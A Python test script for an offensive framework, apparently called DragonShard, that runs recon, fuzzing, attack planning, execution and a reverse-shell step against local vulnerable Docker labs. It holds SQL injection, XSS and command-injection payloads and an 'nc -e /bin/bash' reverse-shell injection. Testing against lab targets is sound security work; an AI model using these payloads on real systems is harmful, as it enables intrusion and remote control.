#!/usr/bin/env python3
"""
Full DragonShard Workflow Test

This script demonstrates the complete DragonShard workflow:
1. Reconnaissance (port scanning, service detection)
2. API Inference (crawling, endpoint discovery)
3. Fuzzing (vulnerability discovery)
4. Planning (attack chain generation)
5. Execution (attack execution)
6. Reverse Shell (post-exploitation)

All tests are performed against real vulnerable Docker containers.
"""

import asyncio
import json
import logging
import requests
import subprocess
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Add the dragonshard package to the path
sys.path.insert(0, '../..')

from dragonshard.recon.scanner import Scanner
from dragonshard.api_inference.unified_crawler import UnifiedCrawler
from dragonshard.fuzzing.fuzzer import Fuzzer
from dragonshard.fuzzing.genetic_mutator import GeneticMutator
from dragonshard.planner.chain_planner import ChainPlanner
from dragonshard.planner.vulnerability_prioritization import VulnerabilityPrioritizer
from dragonshard.executor.executor import AttackExecutor
from dragonshard.executor.session_manager import SessionManager
from dragonshard.executor.reverse_shell import ReverseShellHandler

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class FullWorkflowTester:
    """Complete DragonShard workflow tester."""
    
    def __init__(self):
        """Initialize the workflow tester."""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'DragonShard/1.0'
        })
        
        # Test targets
        self.targets = {
            'vuln-php': 'http://localhost:8082',
            'vuln-node': 'http://localhost:8083',
            'vuln-python': 'http://localhost:8084',
            'vuln-stress-test': 'http://localhost:8085'
        }
        
        # Workflow results
        self.workflow_results = {
            'reconnaissance': {},
            'api_inference': {},
            'fuzzing': {},
            'planning': {},
            'execution': {},
            'post_exploitation': {},
            'performance_metrics': {}
        }
    
    def check_environment(self) -> bool:
        """Check if test environment is ready."""
        logger.info("🔍 Checking test environment...")
        
        try:
            # Check Docker containers
            # Get the current script directory and navigate to the project root
            import os
            script_dir = os.path.dirname(os.path.abspath(__file__))
            project_root = os.path.join(script_dir, '../..')
            
            result = subprocess.run(
                ['docker-compose', '-f', os.path.join(project_root, 'docker-compose.test.yml'), 'ps'],
                capture_output=True,
                text=True,
                cwd=project_root
            )
            
            if result.returncode != 0:
                logger.error("❌ Docker containers are not running!")
                logger.info("Please start the test environment with: make test-env-start")
                return False
            
            logger.info("✅ Docker containers are running")
            return True
            
        except FileNotFoundError:
            logger.error("❌ docker-compose not found!")
            return False
    
    def step1_reconnaissance(self, target_host: str = 'localhost') -> Dict:
        """Step 1: Reconnaissance - Port scanning and service detection."""
        logger.info("🔍 Step 1: Reconnaissance")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize scanner
            scanner = Scanner()
            
            # Scan common ports
            ports_to_scan = [80, 3000, 5000, 8080, 8081, 8082, 8083, 8084, 8085]
            
            scan_results = []
            for port in ports_to_scan:
                logger.info(f"Scanning port {port}...")
                result = scanner.scan_port(target_host, port)
                if result:
                    scan_results.append(result)
            
            scan_time = time.time() - start_time
            
            recon_result = {
                'target_host': target_host,
                'ports_scanned': len(ports_to_scan),
                'open_ports': len(scan_results),
                'scan_time': scan_time,
                'services_discovered': scan_results
            }
            
            logger.info(f"✅ Reconnaissance completed: {len(scan_results)} open ports found")
            for result in scan_results:
                logger.info(f"   Port {result['port']}: {result.get('service', 'unknown')}")
            
            self.workflow_results['reconnaissance'] = recon_result
            return recon_result
            
        except Exception as e:
            logger.error(f"❌ Reconnaissance failed: {e}")
            return {'error': str(e)}
    
    def step2_api_inference(self, target_url: str) -> Dict:
        """Step 2: API Inference - Crawling and endpoint discovery."""
        logger.info("🕷️ Step 2: API Inference")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize crawler
            crawler = UnifiedCrawler()
            
            # Crawl the target
            crawl_results = crawler.crawl(target_url)
            
            crawl_time = time.time() - start_time
            
            # Analyze discovered endpoints
            endpoints = []
            for result in crawl_results:
                if result.get('url'):
                    endpoints.append({
                        'url': result['url'],
                        'method': result.get('method', 'GET'),
                        'status_code': result.get('status_code', 0)
                    })
            
            api_result = {
                'target_url': target_url,
                'pages_crawled': len(crawl_results),
                'endpoints_discovered': len(endpoints),
                'crawl_time': crawl_time,
                'endpoints': endpoints[:10]  # First 10 endpoints
            }
            
            logger.info(f"✅ API Inference completed: {len(endpoints)} endpoints discovered")
            for endpoint in endpoints[:5]:
                logger.info(f"   {endpoint['method']} {endpoint['url']}")
            
            self.workflow_results['api_inference'] = api_result
            return api_result
            
        except Exception as e:
            logger.error(f"❌ API Inference failed: {e}")
            return {'error': str(e)}
    
    def step3_fuzzing(self, target_url: str, endpoints: List[Dict]) -> Dict:
        """Step 3: Fuzzing - Vulnerability discovery."""
        logger.info("🧬 Step 3: Fuzzing")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize fuzzer and mutator
            fuzzer = Fuzzer()
            mutator = GeneticMutator()
            
            # Test different vulnerability types
            vulnerability_types = {
                'sql_injection': {
                    'payloads': ["1' OR '1'='1", "admin'--", "1' UNION SELECT 1,2,3--"],
                    'endpoints': ['/search', '/query', '/api/search']
                },
                'xss': {
                    'payloads': ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
                    'endpoints': ['/?input=', '/xss', '/api/xss']
                },
                'command_injection': {
                    'payloads': ["127.0.0.1; ls", "127.0.0.1 && whoami"],
                    'endpoints': ['/command', '/api/command', '/exec']
                }
            }
            
            fuzzing_results = []
            total_vulnerabilities = 0
            
            for vuln_type, config in vulnerability_types.items():
                logger.info(f"Testing {vuln_type}...")
                
                for endpoint in config['endpoints']:
                    # Find matching endpoints from crawl results
                    matching_endpoints = [ep for ep in endpoints if endpoint in ep['url']]
                    
                    for ep in matching_endpoints:
                        test_url = ep['url']
                        
                        # Run fuzzing
                        results = fuzzer.fuzz_url(
                            url=test_url,
                            method='POST',
                            payload_types=[vuln_type]
                        )
                        
                        # Count successful attacks
                        successful_attacks = [r for r in results if r.get('anomaly_detected')]
                        total_vulnerabilities += len(successful_attacks)
                        
                        if successful_attacks:
                            fuzzing_results.append({
                                'vulnerability_type': vuln_type,
                                'endpoint': test_url,
                                'successful_attacks': len(successful_attacks),
                                'total_tests': len(results)
                            })
            
            fuzz_time = time.time() - start_time
            
            fuzz_result = {
                'target_url': target_url,
                'vulnerability_types_tested': len(vulnerability_types),
                'endpoints_tested': len(endpoints),
                'total_vulnerabilities_found': total_vulnerabilities,
                'fuzz_time': fuzz_time,
                'detailed_results': fuzzing_results
            }
            
            logger.info(f"✅ Fuzzing completed: {total_vulnerabilities} vulnerabilities found")
            for result in fuzzing_results:
                logger.info(f"   {result['vulnerability_type']} on {result['endpoint']}: {result['successful_attacks']} attacks")
            
            self.workflow_results['fuzzing'] = fuzz_result
            return fuzz_result
            
        except Exception as e:
            logger.error(f"❌ Fuzzing failed: {e}")
            return {'error': str(e)}
    
    def step4_planning(self, vulnerabilities: List[Dict]) -> Dict:
        """Step 4: Planning - Attack chain generation."""
        logger.info("🧠 Step 4: Planning")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize planner components
            planner = ChainPlanner()
            prioritizer = VulnerabilityPrioritizer()
            
            # Prioritize vulnerabilities
            prioritized_vulns = prioritizer.prioritize_vulnerabilities(vulnerabilities)
            
            # Generate attack chains
            attack_chains = []
            for vuln in prioritized_vulns[:3]:  # Top 3 vulnerabilities
                chain = planner.generate_attack_chain(vuln)
                if chain:
                    attack_chains.append(chain)
            
            plan_time = time.time() - start_time
            
            plan_result = {
                'vulnerabilities_analyzed': len(vulnerabilities),
                'prioritized_vulnerabilities': len(prioritized_vulns),
                'attack_chains_generated': len(attack_chains),
                'plan_time': plan_time,
                'attack_chains': attack_chains
            }
            
            logger.info(f"✅ Planning completed: {len(attack_chains)} attack chains generated")
            for i, chain in enumerate(attack_chains):
                logger.info(f"   Chain {i+1}: {chain.get('name', 'Unknown')}")
            
            self.workflow_results['planning'] = plan_result
            return plan_result
            
        except Exception as e:
            logger.error(f"❌ Planning failed: {e}")
            return {'error': str(e)}
    
    def step5_execution(self, attack_chains: List[Dict]) -> Dict:
        """Step 5: Execution - Attack execution."""
        logger.info("⚔️ Step 5: Execution")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize executor
            executor = AttackExecutor()
            session_manager = SessionManager()
            
            # Execute attack chains
            execution_results = []
            successful_executions = 0
            
            for chain in attack_chains:
                logger.info(f"Executing attack chain: {chain.get('name', 'Unknown')}")
                
                # Create session
                session_id = session_manager.create_session(chain.get('target', 'unknown'))
                
                # Execute chain
                result = executor.execute_attack_chain(chain, session_id)
                
                if result.get('success'):
                    successful_executions += 1
                    execution_results.append(result)
                
                # Clean up session
                session_manager.destroy_session(session_id)
            
            exec_time = time.time() - start_time
            
            exec_result = {
                'attack_chains_executed': len(attack_chains),
                'successful_executions': successful_executions,
                'execution_time': exec_time,
                'success_rate': successful_executions / len(attack_chains) if attack_chains else 0,
                'results': execution_results
            }
            
            logger.info(f"✅ Execution completed: {successful_executions}/{len(attack_chains)} successful")
            
            self.workflow_results['execution'] = exec_result
            return exec_result
            
        except Exception as e:
            logger.error(f"❌ Execution failed: {e}")
            return {'error': str(e)}
    
    def step6_post_exploitation(self, target_url: str) -> Dict:
        """Step 6: Post-Exploitation - Reverse shell and persistence."""
        logger.info("🐚 Step 6: Post-Exploitation")
        logger.info("=" * 40)
        
        try:
            start_time = time.time()
            
            # Initialize reverse shell handler
            reverse_shell_handler = ReverseShellHandler()
            
            # Create reverse shell listener
            connection_id = reverse_shell_handler.create_listener(port=4446)  # Use different port
            
            # Test reverse shell trigger
            test_url = f"{target_url}/command"
            payload = "127.0.0.1; nc 127.0.0.1 4444 -e /bin/bash"
            
            response = self.session.post(test_url, data={'command': payload})
            
            # Get connection info
            connection_info = reverse_shell_handler.get_connection_info(connection_id)
            
            # Clean up
            reverse_shell_handler.close_connection(connection_id)
            
            post_exploit_time = time.time() - start_time
            
            post_exploit_result = {
                'target_url': target_url,
                'reverse_shell_created': True,
                'connection_id': connection_id,
                'payload_sent': True,
                'response_status': response.status_code,
                'connection_info': connection_info,
                'post_exploit_time': post_exploit_time
            }
            
            logger.info(f"✅ Post-Exploitation completed: Reverse shell listener created")
            
            self.workflow_results['post_exploitation'] = post_exploit_result
            return post_exploit_result
            
        except Exception as e:
            logger.error(f"❌ Post-Exploitation failed: {e}")
            return {'error': str(e)}
    
    def run_full_workflow(self, target_name: str, target_url: str) -> Dict:
        """Run the complete DragonShard workflow."""
        logger.info(f"🚀 Running Full DragonShard Workflow")
        logger.info(f"🎯 Target: {target_name} ({target_url})")
        logger.info("=" * 60)
        
        workflow_start = time.time()
        
        # Step 1: Reconnaissance
        recon_result = self.step1_reconnaissance()
        
        # Step 2: API Inference
        api_result = self.step2_api_inference(target_url)
        
        # Step 3: Fuzzing
        endpoints = api_result.get('endpoints', [])
        fuzz_result = self.step3_fuzzing(target_url, endpoints)
        
        # Step 4: Planning
        vulnerabilities = fuzz_result.get('detailed_results', [])
        plan_result = self.step4_planning(vulnerabilities)
        
        # Step 5: Execution
        attack_chains = plan_result.get('attack_chains', [])
        exec_result = self.step5_execution(attack_chains)
        
        # Step 6: Post-Exploitation
        post_exploit_result = self.step6_post_exploitation(target_url)
        
        # Calculate total workflow time
        workflow_time = time.time() - workflow_start
        
        # Compile final results
        final_results = {
            'target': target_name,
            'target_url': target_url,
            'workflow_time': workflow_time,
            'steps': {
                'reconnaissance': recon_result,
                'api_inference': api_result,
                'fuzzing': fuzz_result,
                'planning': plan_result,
                'execution': exec_result,
                'post_exploitation': post_exploit_result
            },
            'summary': {
                'total_vulnerabilities': fuzz_result.get('total_vulnerabilities_found', 0),
                'attack_chains_generated': plan_result.get('attack_chains_generated', 0),
                'successful_executions': exec_result.get('successful_executions', 0),
                'reverse_shell_created': post_exploit_result.get('reverse_shell_created', False)
            }
        }
        
        return final_results
    
    def print_workflow_results(self, results: Dict):
        """Print comprehensive workflow results."""
        logger.info("📊 Full Workflow Results")
        logger.info("=" * 60)
        
        target = results.get('target', 'Unknown')
        workflow_time = results.get('workflow_time', 0)
        summary = results.get('summary', {})
        
        logger.info(f"🎯 Target: {target}")
        logger.info(f"⏱️ Total Workflow Time: {workflow_time:.2f} seconds")
        logger.info("")
        
        # Step results
        steps = results.get('steps', {})
        
        logger.info("📋 Step Results:")
        logger.info(f"   🔍 Reconnaissance: {steps.get('reconnaissance', {}).get('open_ports', 0)} open ports")
        logger.info(f"   🕷️ API Inference: {steps.get('api_inference', {}).get('endpoints_discovered', 0)} endpoints")
        logger.info(f"   🧬 Fuzzing: {steps.get('fuzzing', {}).get('total_vulnerabilities_found', 0)} vulnerabilities")
        logger.info(f"   🧠 Planning: {steps.get('planning', {}).get('attack_chains_generated', 0)} attack chains")
        logger.info(f"   ⚔️ Execution: {steps.get('execution', {}).get('successful_executions', 0)} successful")
        logger.info(f"   🐚 Post-Exploitation: {'✅' if steps.get('post_exploitation', {}).get('reverse_shell_created') else '❌'}")
        
        logger.info("")
        logger.info("📈 Summary:")
        logger.info(f"   Total Vulnerabilities: {summary.get('total_vulnerabilities', 0)}")
        logger.info(f"   Attack Chains Generated: {summary.get('attack_chains_generated', 0)}")
        logger.info(f"   Successful Executions: {summary.get('successful_executions', 0)}")
        logger.info(f"   Reverse Shell Created: {'✅' if summary.get('reverse_shell_created') else '❌'}")
        
        # Save results to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"full_workflow_results_{target}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info(f"💾 Results saved to {filename}")


def main():
    """Main function."""
    logger.info("🐉 DragonShard Full Workflow Tester")
    logger.info("=" * 60)
    
    # Create tester
    tester = FullWorkflowTester()
    
    # Check environment
    if not tester.check_environment():
        return 1
    
    # Test targets
    targets = {
        'vuln-php': 'http://localhost:8082',
        'vuln-node': 'http://localhost:8083'
    }
    
    all_results = {}
    
    # Run workflow for each target
    for target_name, target_url in targets.items():
        logger.info(f"🎯 Testing {target_name}...")
        
        try:
            results = tester.run_full_workflow(target_name, target_url)
            all_results[target_name] = results
            tester.print_workflow_results(results)
            
        except Exception as e:
            logger.error(f"❌ Workflow failed for {target_name}: {e}")
            all_results[target_name] = {'error': str(e)}
    
    logger.info("=" * 60)
    logger.info("🎉 Full Workflow Tests Completed!")
    
    return 0


if __name__ == '__main__':
    exit(main()) 